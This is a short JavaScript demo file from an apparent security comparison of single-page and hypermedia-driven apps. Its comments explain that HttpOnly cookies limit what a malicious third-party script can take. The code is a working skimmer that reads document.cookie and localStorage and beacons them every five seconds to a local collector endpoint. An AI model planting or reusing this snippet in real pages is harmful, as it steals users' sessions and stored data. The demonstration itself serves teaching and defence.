// Same attacker code as the SPA's compromised dependency, but delivered to the
// HDA app the way third-party code usually arrives there: a <script> tag.
//
// DEMO (issue 3, HDA side): the script STILL runs and can read the DOM. But the
// session lives in an HttpOnly cookie (invisible to JS) and there is no token or
// bulk data in localStorage — so the same code exfiltrates nothing useful.
// The blast radius is smaller; it is NOT zero (it can still read visible page
// content), so any <script> you add remains dangerous.
(function () {
  function exfiltrate() {
    var cookie = document.cookie // HttpOnly session cookie is NOT included here
    var ls = JSON.stringify(localStorage) // empty in the HDA app
    new Image().src =
      'http://localhost:5999/collect?t=' +
      encodeURIComponent(
        'HDA third-party script sees -> cookie=[' + cookie + '] localStorage=' + ls
      )
  }
  exfiltrate()
  setInterval(exfiltrate, 5000)
})()
